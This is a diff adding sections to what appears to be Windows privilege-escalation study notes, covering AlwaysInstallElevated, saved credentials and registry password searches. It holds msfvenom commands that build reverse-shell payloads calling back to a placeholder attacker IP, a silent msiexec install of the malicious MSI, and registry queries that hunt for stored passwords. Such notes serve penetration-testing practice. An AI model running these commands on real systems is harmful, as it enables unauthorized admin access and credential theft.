@@ -91,6 +91,7 @@ Any port listed as “LISTENING” that was not discovered with the external por
 
 ## Sheduled tasks
 
+Like CronTab in Linux
 ```console
 $ schtasks /query /fo LIST /v
 ```
@@ -189,4 +190,42 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address]
 Upload file and start service:
 ```console
 $ sc start unquotedsvc
+```
+
+## Token Impersonation
+
+ToDo
+
+## AlwaysInstallElevated
+
+Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges if the installation requires administrator privileges.
+This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
+
+This method requires two registry values to be set. You can query these from the command line using the commands below.
+
+```
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+Generate msi file:
+```
+$ msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+```
+
+Execute msi on target:
+```
+$ C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+```
+
+## Password
+
+```console
+List saved Creds:
+$ cmdkey /list
+$ runas /savecred /user:admin reverse_shell.exe
+
+Registry keys:
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 ```
